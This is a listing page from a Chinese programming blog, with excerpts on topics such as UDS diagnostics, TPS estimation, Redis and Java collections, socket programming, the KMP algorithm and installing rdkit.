<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe0b03e85f34c9e88b8a2d9fdc94f33d/" rel="bookmark">
			UDS之浅谈14 服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 一、服务概述二、报文1.请求报文定义2.肯定响应3.否定响应码4.报文讲解4.1格式及内容4.2举例 一、服务概述 14服务用于清除存储的故障诊断信息
二、报文 1.请求报文定义 针对Group DTC：
可以清除一组DTCs（e.g. Powertrain, Body, Chassis, etc.）；可以清除特定DTC；FF FF FF意味清除全部DTC 2.肯定响应 3.否定响应码 0x72-通用编程错误：这个是指在擦除EEPROM中的DTC信息时，对EEPROM的操作发生错误，导致清除失败
4.报文讲解 4.1格式及内容 发 送： 14+Group DTC
正响应： 54
4.2举例 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e63e60ad967733d2965643104d3f109/" rel="bookmark">
			TPS计算方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、普通计算方法 计算公式：TPS= 总请求数 / 总时间
按照需求所示，在2019年第32周，有4.13万的浏览量，那么总请求数，我们可以认为估算为4.13万（1次浏览都至少对应1个请求）
总请求数 = 4.13 万请求数 = 41300 请求数
总时间：由于不知道每个请求的具体时间，我们按照普通方法，我们可以按照一周的时间进行计算，总时间 = 1天 = 1 * 24 小时 = 24 * 3600 秒
套入公式可得：TPS = 41300请求数/24*3600秒 = 0.48请求数/秒
结论：按照普通计算方法，我们在测试环境对相同的系统进行性能测试时，每秒能够发送0.48请求就可以满足线上的需要
2、二八原则计算方法 二八原则就是指80%的请求在20%的时间内完成
计算公式 ： TPS = 总请求数 80% / (总时间20%)
**按照公式进行计算：TPS = 41300 * 0.8请求数 / 24*3600*0.2秒 = 1.91 请求数/秒
**结论：**按照二八原则计算，在测试环境我们的TPS只要能达到1.91请求数每秒就能满足线上需要。二八原则的估算结果会比平均值的计算方法更能满足用户需求。
3、按照业务数据进行计算 计算模拟用户正常业务操作（稳定性测试）的并发量：
根据这些数据统计图，可以得出结论：
大部分订单在8点-24点之间，因此系统的有效工作时长为16个小时
从订单数量统计，8-24点之间的订单占一天总订单的98%左右（40474个）
结合二八原则计算公式 ： TPS = 总请求数 80% / (总时间20%)
需要在测试环境模拟用户正常业务操作（稳定性测试）的并发量为：TPS = 40474 * 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e63e60ad967733d2965643104d3f109/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50e613b06423c103fdeb22dcad2955de/" rel="bookmark">
			UE4-材质自发光
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.创建材质，选择无光照，将贴图及控制自发光强度参数逻辑连接完成。使用staticswitchparameter 节点进行判断是否开启自发光
2.设置完成后，在场景中选择自发光物体，细节面板找到光照/Lightmass/使用静态光照的自发光/勾选。
勾选后的效果上自发光物体会影响场景，并且只有在烘焙之后影响场景。如果不勾选只能看上去是自发光。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47348af52e7e30df8e6bc8a6f9e8c73b/" rel="bookmark">
			Intersection Observer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 网页的开发，经常需要了解某个元素是否进入了“视口”，即用户能不能看到它
技术实现方案：
监听scroll事件Intersection Observer API 第一种，传统的实现方案计算量很大，容易造成性能问题；第二种名为“交叉观察器”，可以自动“观察元素”是否可见。接下来，将深入看看此API
API ConstructorIntersectionObserver()监听目标元素的可见部分穿过一个或多个阈时，会执行指定的回调函数属性root 监听对象的具体祖先元素（element）
未传入值或值为null,默认使用顶级文档的视窗
rootMargin 根边界盒的矩形偏移量
默认值：“0px 0px 0px 0px”
偏移量单位：像素 || 百分比
thresholds 监听对象的交叉区域与边界区域的比率
如果构造器为传入值，默认值为0
方法disconnect()停止监听工作observe()开始监听一个目标元素takeRecords返回四偶有观察目标的对象数组unobserve()停止监听特定目标元素 用法 var io = new IntersectionObserver(callback, option); IntersectionObserver : 浏览器原生提供的构造函数，接收两个参数callback：可见性变化时的回调函数option: 配置对象 callback参数 var io = new IntersectionObserver ( entries =&gt; { console.log(entries) } ) callback一般会触发两次：
目标元素刚刚进入视口完全离开视口 IntersectionObserverEntry 对象 { time: 0.92, rootBounds: ClientRect { bottom: 100, height: 800, left: 10, right: 600, top: 0, width: 300 }, boundingClientRect: ClientRect{}, intersectionRect: ClientRect{}, intersectionRatio: 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47348af52e7e30df8e6bc8a6f9e8c73b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56d48745a4a5e43cb7b8964bc6f2f783/" rel="bookmark">
			Power BI——DIVIDE函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、定义： 执行安全除法，可以在被 0 除时返回备用结果或空值。
二、语法： *说明：
1.分子，被除数
2.分母，除数
3.备用结果，可选-分母为 0 时的结果，避免返回错误值。被 0 除时使用的备用结果必须是一个常量，默认使用空值。
三、返回值： 标量： 一个小数值（可通过“格式化”设置为百分比格式）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbe994ffbec72f8c45e34248f3e57036/" rel="bookmark">
			js-xlsx使用-解析生成xlsx文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.js-xlsx 介绍
由SheetJS出品的js-xlsx是一款非常方便的只需要纯JS即可读取和导出excel的工具库，功能强大，支持格式众多，支持xls、xlsx、ods(一种OpenOffice专有表格文件格式)等十几种格式。本文全部都是以xlsx格式为例。
官方github：https://github.com/SheetJS/js-xlsx
本文配套demo在线演示地址：http://demo.haoji.me/2017/02/08-js-xlsx/
本文同步首发于我的个人博客和博客园。
1.1. 兼容性
兼容性如下图：
1.2. 如何使用
dist目录下有很多个JS文件，一般情况下用xlsx.core.min.js就够了，xlsx.full.min.js则是包含了所有功能模块。
直接script标签引入即可：
读取excel
读取excel主要是通过XLSX.read(data, {type: type});方法来实现，返回一个叫WorkBook的对象，type主要取值如下：
base64: 以base64方式读取；
binary: BinaryString格式(byte n is data.charCodeAt(n))
string: UTF8编码的字符串；
buffer: nodejs Buffer；
array: Uint8Array，8位无符号数组；
file: 文件的路径（仅nodejs下支持）；
2.1. 获取workbook对象
2.1.1. 读取本地文件
直接上代码：
// 读取本地excel文件functionreadWorkbookFromLocalFile(file, callback){varreader =newFileReader(); reader.onload =function(e){vardata = e.target.result;varworkbook = XLSX.read(data, {type:'binary'});if(callback) callback(workbook); }; reader.readAsBinaryString(file);}
2.1.2. 读取网络文件
// 从网络上读取某个excel文件，url必须同域，否则报错functionreadWorkbookFromRemoteFile(url, callback){varxhr =newXMLHttpRequest(); xhr.open('get', url,true); xhr.responseType ='arraybuffer'; xhr.onload =function(e){if(xhr.status ==200) {vardata =newUint8Array(xhr.response)varworkbook = XLSX.read(data, {type:'array'});if(callback) callback(workbook); } }; xhr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbe994ffbec72f8c45e34248f3e57036/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/081f56973e9540a8a5e08d31b11452e5/" rel="bookmark">
			建筑测量【8】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.导线的坐标增量闭合差调整后，应使纵、横坐标增量改正数之和等于（）。
A.纵、横坐标增量闭合差，其符号相反
B.导线全长闭合差，其符号相同
D.纵、横坐标增量闭合差，其符号相同
2.建筑物的变形观测包括（）两个方面。
B.沉降
C.水平位移
D.垂直位移
3.丈量一正方形的4条边长，其观测每条边的中误差均为±2cm，则该正方形周长的中误差为±（）cm。
A.2
B.0.2
C.8
D.4
4.水准仪中，水准管轴和视准轴的正确关系为（）
A.水准管轴垂直于视准轴
B.以上都不是
C.水准管轴平行于视准轴
D.水准管轴相交于视准轴
5.水淮测量的原理是:为测定两点间的高差,必须利用水准仪提供的哪一条线
A.视准轴线
B.倾斜视线
C.视线
D.水平视线
6.测站点O与观测目标A、B位置不变,如仪器高度发生变化,则观测结果将有下述哪种改变?
A.水平角和竖直角都改变
B.竖直角改变、水平角不变
C.水平角改变、竖直角不变
D.水平角和竖直角都不改变
7.高程为建筑物室内地坪的设计高程的水准点是（）
A.四等水准点
B.建筑方格网点
C.±0.000水准点
D.建筑物高程点
8.由于在测绘地形图时遵行“从整体到局部，先控制后碎部”的原则，所以在施工测量时就没必要再遵行“从整体到局部，先控制后碎部”的原则了。该表述（）
9.用钢尺往返丈量120m的距离,要求相对误差达到1/10000,则往返校差不得大于
A.0.012m
B.0.048m
C.0.024m
D.0.036m
10.观测误差根据其对测量结果影响的性质不同，可分为（）和偶然误差两类
A.相对误差；
B.系统误差
C.中误差；
D.往返误差
11.直线定向中，常用的标准方向有()。①真子午线方向②y轴方向③磁子午线方向④指南方向⑤重力方向⑥中央子午线方向
A.①③④
B.①②④
C.①③⑥
D.②④⑥
12.方位角的分类不包括下列哪项（）
A.坐标方位角
B.真方位角
C.磁方位角
D.轴方位角
13.水准测量中要求测段设置偶数站，主要是为了消除下列哪项误差影响。（）
A.标尺倾斜误差
B.标尺弯曲误差
C.一对标尺零点差
D.标尺分划误差
14.一组测量值的中误差越小，表明测量精度越（）。
A.低
B.无法确定
C.精度与中误差没有关系
D.高
15.测设的基本工作是测设已知的（）、水平角和高程。
A.水平距离
B.空间坐标
C.平面坐标
D.空间距离
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/081f56973e9540a8a5e08d31b11452e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b70f6130611465ee68a9f2a9fe6ab94/" rel="bookmark">
			java容器面经
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		集合大体框架图 集合的数据结构底层实现 List Arraylist： Object[] 数组Vector：Object[] 数组LinkedList： 双向链表(JDK1.6 之前为循环链表，JDK1.7 取消了循环) Set HashSet(无序，唯一): 基于 HashMap 实现的，底层采用 HashMap 来保存元素LinkedHashSet: LinkedHashSet 是 HashSet 的子类，并且其内部是通过 LinkedHashMap 来实现的。有点类似于我们之前说的 LinkedHashMap 其内部是基于 HashMap 实现一样，不过还是有一点点区别的TreeSet(有序，唯一): 红黑树(自平衡的排序二叉树) Queue PriorityQueue: Object[] 数组来实现二叉堆ArrayQueue: Object[] 数组 + 双指针 再来看看 Map 接口下面的集合。
Map 一般就是数组+链表 HashMap的话链表长度大于8 就会转化为红黑树
有Tree的比如TreeMap就是红黑树
HashMap： JDK1.8 之前 HashMap 由数组+链表组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突）。JDK1.8 以后在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间LinkedHashMap： LinkedHashMap 继承自 HashMap，所以它的底层仍然是基于拉链式散列结构即由数组和链表或红黑树组成。另外，LinkedHashMap 在上面结构的基础上，增加了一条双向链表，使得上面的结构可以保持键值对的插入顺序。同时通过对链表进行相应的操作，实现了访问顺序相关逻辑。
LinkHashMap如何实现有序的：
在HashMap的基础上增加了一个双向链表，LinkedHashMap对Entry进行了扩展，增加了指针before和after。
Hashtable： 数组+链表组成的，数组是 Hashtable 的主体，链表则是主要为了解决哈希冲突而存在的TreeMap： 红黑树（自平衡的排序二叉树） Arraylist 与 LinkedList 区别 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b70f6130611465ee68a9f2a9fe6ab94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdc84222ca1a2668de7de81e5dd20409/" rel="bookmark">
			转载：模吧即将关站的说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模吧即模友之吧（www.moz8.com），建站以来得到广大模友的支持，会员累计16万4千余人，累计发帖84万6千余篇，但近些年由于新媒体的崛起，论坛每况愈下，再加上缺少精力去做维护和拓展，造成模吧活跃度差强人意。
模吧服务器到期时间是2022年3月15日，到期将不再续费，考虑关站。
关站前，大家可以备份数据，如果钱包中有余款的，请及早申请提现。
感谢大家这些年的帮助与陪伴。
如果有模友或公司想接手经营模吧，请加我微信6162575（注明来意）商议。转让事宜请看 《模吧关站与转让的补充说明》。
模吧
2022年1月16日
ps：
虽然不是这个论坛的老用户，虽然接触得比较晚，但是我在这上面还是学到了很多东西，最近突然发现要关闭了，觉得很可惜的，最近几天我会把部分很实用的开源资料搬运到csdn博客里，希望能保留一些记忆，不让前辈的心血被埋没，向开源爱好者致敬。
时间仓促，未获授权，如果相关方不认可，愿意立即删除。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/effb39ab3bc3f8f518e666d4b236cd27/" rel="bookmark">
			【Linux网络（C&#43;&#43;)】——网络套接字（TCP/UDP编程模型）多进程，多线程，线程池服务器开发（画图解析）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一. 套接字基本概念
📚 IP地址
📚 TCP和UDP协议 📚 端口号
📚 端口号vs 进程pid
📚 网络字节序
本地字节序转换成网络字节序
网络字节序转换为本地字节序
二. 套接字的基本操作
📚 socket的创建
域(domain)
类型（type）
协议（Protcol）
返回值
📚 struct socketaddr地址结构
struct sockaddr 结构
struct sockaddr_in 结构
📚 socket绑定地址（bind函数）
📚 Socket监听连接（listen函数）
📚 Socket请求连接(connect函数）
📚 Socket接受连接（accept函数）
📚 Socket接受数据 （recvfrom函数）
📚 Socket发送数据（sendto函数）
📚 Socket关闭
三. UDP编程模型
四. Tcp编程模型
多进程服务器
多线程服务器
线程池服务器
五. netstate命令
一. 套接字基本概念 所谓套接字(Socket)，就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象，一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制
📚 IP地址 IP地址是在IP协议中，主要功能是用来标识网络上不同主机的地址。
IP地址是由32位组成，主要由三部分：地址类别，网络号和主机号：
📚 TCP和UDP协议 TCP/IP协议传输层使用最广泛的两个协议分别是TCP协议和UDP协议，UDP套接口是数据报套接字的一种，而TCP套接口是字节流套接字的一种。
TCP/IP协议传输层的 主要任务是向位于不同的（有时候位于同一主机）上的应用程序提供端到端的通信服务，为了区分应用程序，TCP和UDP引入了端口号的概念，端口本质是一个16位的整数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/effb39ab3bc3f8f518e666d4b236cd27/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad8f8eb0c92099516e4a88440aecc010/" rel="bookmark">
			Android DataUsage
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Android性能测试之网络流量Android中的 eBPF 流量监控​​​​​​​ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/930682f7fec3dec3bdfe9f8553cc3a8d/" rel="bookmark">
			Feign常用调用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Get和Post Feign默认所有带参数的请求都是Post，想要使用指定的提交方式需引入依赖。
&lt;dependency&gt; &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt; &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt; &lt;/dependency&gt; 并指明提交方式
@RequestMapping(value = "/alived", method = RequestMethod.POST)
@GetMapping("/findById") 2、User-Comsumer （1）ConsumerApi 这里的@GetMapping是给Feign看的，组装get请求（user-provider/getMap），@RequestParam("id")也是给Feign看的，组装get请求（user-provider/getMap/?id={1}）。
@FeignClient(name = "user-provider") public interface ConsumerApi extends UserApi { @GetMapping("/getMap") Map&lt;Integer, String&gt; getMap(@RequestParam("id") Integer id); @GetMapping("/getMap2") Map&lt;Integer, String&gt; getMap2(@RequestParam("id") Integer id,@RequestParam("name") String name); @GetMapping("/getMap3") Map&lt;Integer, String&gt; getMap3(@RequestParam Map&lt;String, Object&gt; map); @PostMapping("/postMap") Map&lt;Integer, String&gt; postMap(Map&lt;String, Object&gt; map); } （2）MainController 主要用于接收客户端的请求。
@RestController public class MainController { @Autowired ConsumerApi api; @GetMapping("/map") public Map&lt;Integer, String&gt; map(Integer id) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/930682f7fec3dec3bdfe9f8553cc3a8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98bc770124c17df2cc0aa8e71189c462/" rel="bookmark">
			InputStream的read()读取机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		public void readArr() { // 明确文件 File file = new File("D:/net.txt"); // 构建流的对象 InputStream inputStream = null; try { inputStream = new FileInputStream(file); // 声名缓冲数组 int i; byte[] bytes = new byte[5]; while ((i = inputStream.read(bytes)) != -1) { for (int j = 0; j &lt; i; j++) { System.out.print((char)bytes[j]); } } } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } finally { try { if (inputStream !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98bc770124c17df2cc0aa8e71189c462/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74c16e2e6bcc1c069967cdf6d17bf9d8/" rel="bookmark">
			LeetCode1631 - 最小体力消耗 （二分法BFS遍历、并查集）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目：
You are a hiker preparing for an upcoming hike. You are given heights, a 2D array of size rows x columns, where heights[row][col] represents the height of cell (row, col). You are situated(位于) in the top-left cell, (0, 0), and you hope to travel to the bottom-right cell, (rows-1, columns-1) (i.e., 0-indexed). You can move up, down, left, or right, and you wish to find a route that requires the minimum effort.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74c16e2e6bcc1c069967cdf6d17bf9d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbcfbe6ebc271f9e646413579d2e7bd0/" rel="bookmark">
			navigator.geolocation.getCurrentPosition在谷歌浏览器不执行的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在React 中使用navigator.geolocation.getCurrentPosition去获取定位信息时
// 获取地理位置信息 navigator.geolocation.getCurrentPosition(position =&gt; { console.log('当前位置信息：', position) }) 发现在谷歌浏览器中是不执行的，原因是在谷歌浏览器里navigator.geolocation的使用，只能使用https协议，普通的http协议是无法执行的。
解决方法：
换成ie 和火狐都可以正常使用的，或者使用https协议
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e51f06ec0e44d4f50d90329c3e5c508f/" rel="bookmark">
			常见的几种元器件封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初学PCB画图搞不明白各种元器件封装，这里列举几种常见的元器件封装
简单分为两类：
1.直插型 TO（Transistor Outlie）封装、单列直插封装SIP（single in-line package）、双列直插型（DIP）封装
2.贴片型 (1).SOT(2).小外形封装SOP（Small Outline Package) SOP+脚位数
(3).QFJ 分 塑封芯片J引线芯片封装PLCC（Plastic Leaded Chip Carrier) 和
陶瓷芯片J引线芯片封装CLCC（Ceramic Leaded Chip Carrier)
(4).DFN(只有两侧有焊盘)
(5).QFN(也指LCC) (6).QFP
(7).BGA
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62051b31ac8b28795fea3bb11afaf4d2/" rel="bookmark">
			Redis面经
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考
link
Redis是什么 简单来说 Redis 就是一个使用 C 语言开发的，开源的高性能key-value非关系缓存数据库，不过与传统数据库不同的是 Redis 的数据是存在内存中的 ，也就是它是内存数据库，所以读写速度非常快，每秒可以处理超过 10万次读写操作，因此 Redis 被广泛应用于缓存方向。
另外，Redis 除了做分布式缓存之外，也经常用来做分布式锁，甚至是消息队列。
Redis 提供了多种数据类型（字符串、列表、集合、散列表、有序集合 zset）来支持不同的业务场景。Redis 还支持事务 、持久化、Lua 脚本、多种集群方案。
Redis用途 应用场景 分布式缓存：性能key-value非关系缓存数据库 支持集群模式分布式锁 ： 通过 Redis 来做分布式锁是一种比较常见的方式。通常情况下，我们都是基于 Redisson 来实现分布式锁。限流 ：一般是通过 Redis + Lua 脚本的方式来实现限流。消息队列 ：Redis 自带的 list 数据结构可以作为一个简单的队列使用。Redis5.0 中增加的 Stream 类型的数据结构更加适合用来做消息队列。它比较类似于 Kafka，有主题和消费组的概念，支持消息持久化以及 ACK 机制。复杂业务场景 ：通过 Redis 以及 Redis 扩展（比如 Redisson）提供的数据结构，我们可以很方便地完成很多复杂的业务场景比如通过 bitmap 统计活跃用户、通过 sorted set 维护排行榜。 如排行榜 计算器应用 Redis 常见数据结构以及使用场景分析 string
Redis自己构建了一种 简单动态字符串（simple dynamic string，SDS）
相比于 C 的原生字符串，Redis 的 SDS 不光可以保存文本数据还可以保存二进制数据，并且获取字符串长度复杂度为 O(1)（C 字符串为 O(N)）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62051b31ac8b28795fea3bb11afaf4d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b482475090c9496d246046a0550e73a/" rel="bookmark">
			kmp算法简单讲解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 上午学习了kmp算法的思想，下午学习了如何实现kmp算法，并对这些内容进行了总结。
写在前面
文章中可能会先讲解很多貌似毫不相关的知识点，但这些都是学习kmp算法需要知道的东西，先了解这些知识点后我们就可以更好的理解kmp算法了。
目录
kmp的作用
暴力算法简介
kmp算法相对于暴力算法的优化
前后缀
最长相等前后缀
获取前缀值
构建前缀表
kmp的作用 在一个已知字符串（文本串）中查找子串（模式串）的位置,也叫做串的模式匹配。
暴力算法简介 从主串s 和子串t 的第一个字符开始，将两字符串的字符一一比对，如果出现某个字符不匹配，主串回溯到第二个字符，子串回溯到第一个字符再进行一一比对......一直到子串字符全部匹配成功。
最好的时间复杂度：O(n)
最坏的时间复杂度：O(m*n)
kmp算法相对于暴力算法的优化 KMP 算法主要是通过消除主串指针的回溯，以及改变字串回溯的位置来提高匹配的效率的
具体实现就是通过一个next()函数（即构造的前缀表）实现，函数本身包含了模式串的局部匹配信息。KMP算法的时间复杂度O(m+n)
前后缀 前缀表示包含第一个字符，但不包含最后一个字符的字串
后缀表示包含最后一个字符，但不包含第一个字符的字串
上例子：
字符串 abcdab
前缀的集合：{a,ab,abc,abcd,abcda}
后缀的集合：{b,ab,dab,cdab,bcdab}
最长相等前后缀 字符串 abcdab
前缀的集合：{a,ab,abc,abcd,abcda}
后缀的集合：{b,ab,dab,cdab,bcdab}
最长相等前后缀就是ab
理解了这里，关于kmp算法子串回溯到哪个字符，现在可以着手解决了
获取前缀值 事实上，每一个字符前的字符串都有最长相等前后缀，而且最长相等前后缀的长度是我们移位的关键，所以我们单独用一个next数组存储子串的最长相等前后缀的长度。
next数组即我们需要构造的前缀表
每一个字符前的字符串的最长相等前后缀即该字符的前缀值
前缀值：
前缀值不仅仅代表着对应位置字符串前后缀相同元素长度的最大值
因为是前后缀的公共元素，它还可以表示该位置与从字符串首位起固定位置的字符相同，即指向自身与其相同的元素的位置。
文本串用例：ABABD
前缀表（前缀值表）
对于任意一个字符串，我们很容易得到它的第一个前缀字符（数组索引为0）对应的前缀值一定为0（因为第一个前缀字符只有一个字符A没有前后缀，所以也不存在公共元素）
构建前缀表 分为三步：
1、初始化
2、前后缀的末尾不相同时怎么处理
3、前后缀的末尾相同时怎么处理
void getnext(next,s) { j=0; next[0]=0;//初始化 for(i=1;i&lt;s.size();i++) { while(j&gt;0&amp;&amp;s[i]!=s[j])//前后缀的末尾不相同时怎么处理 j=next[j-1];//往前面的next数组里找一个j，使s[i]==s[j] //意思是说，一旦s[i] != s[j]，即不能继续延长最大相等前后缀的值 //就跑到已经对比过的前缀里对比，next[j-1]就是前一个位置最大相等前后缀的值 if(s[i]==s[j]) j++;//前后缀的末尾相同时怎么处理 next[i]=j; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c846e9e99558dd8d9b43f01e4a659d3/" rel="bookmark">
			10天智能锁项目实战第1天（了解单片机STM32F401RET6和C语言基础）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		10天智能锁项目实战第1天（了解单片机STM32F401RET6和C语言基础） 一、学习目标二、了解单片机STM32F401RET6三、C语言基础 一、学习目标 二、了解单片机STM32F401RET6 4、STM32F401RE特征
三、C语言基础 1.数据类型
常用2的次方：
2^7 = 128
2^8 = 256
2^15 = 32768
2^16= 65536
51单片机常见的数据类型：
char: 占内存1字节 取值范围：-128~127 -2^7 ~ 2^7-1
unsigned char: 0~255
int: 占内存4字节 取值范围：-32768~32767
unsigned int: 0~65535
long int : 占内存4字节 取值范围：-2147483648~2147483647
unsigned long int:0~4294967295
补充：1字节（byte） = 8位（bit） 每一位代表 0/1
2.进制转换
① 十进制转换为二进制
Eg：83
② 16进制转换为二进制
Eg：0XFF
16进制： 0 1 2 3 4 5 6 7 8 9 A B C D E Ff:1 2 4 8
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c846e9e99558dd8d9b43f01e4a659d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/940260eb3a71105160c14ac5c2dfd35d/" rel="bookmark">
			Python 常用写法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		时间 1.now import datetime
now=datetime.now()
nowStr=now.strftime(now,"%Y%m%d%H%M%S")
list 1.分割最后一个 arr=str.rsplit(" ",1)
2.数组，加索引 enumerate(arr)
3.数组，去除空 arr=[x for x in arr if x !=""]
arr=filter(None, arr)
4.去重复 arr=list(set(arr))
5. 是否某条件满足 a = [1, 2, 3, 4, 5]
# 必须所有元素小于等于5 print(all(_ &lt;= 5 for _ in a)) # True
# 存在元素等于5即可 print(any(_ == 5 for _ in a)) # True
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1157ba346fa04e3048f0f2fac8ef215d/" rel="bookmark">
			anaconda安装&amp;rdkit安装指南
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rdkit确实不好装，折腾了好几天之后，也算摸出一点经验，在这分享一下。
官方推荐从conda开始装，所以本文从anaconda的安装开始介绍起，然后介绍如何安装rdkit。
首先，安装anaconda。
anaconda是开源的，但是官方下载很慢，推荐在清华大学镜像站下载。
https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/
下载后，windows下直接按照流程打开应用程序安装即可。
安装完成后会在开始菜单中出现如下：
其中的Anaconda Prompt (anaconda3)可以打开，是类似cmd的窗口，输入命令：conda -V，如果显示出版本号，则安装成功
附常用conda 源命令：
conda config --show channels	##显示目前的源 conda config --remove channels urls	##删除源 conda config --add channels urls	##添加源 =============================================
构建好了anaconda环境后，参考以下命令来安装rdkit
windows下推荐下面第一个官方说明
https://anaconda.org/conda-forge/rdkit
下面第二个官方说明我是用来在linux服务器下创建rdkit的运行环境
https://www.rdkit.org/docs/Install.html
但有稍作修改如下：
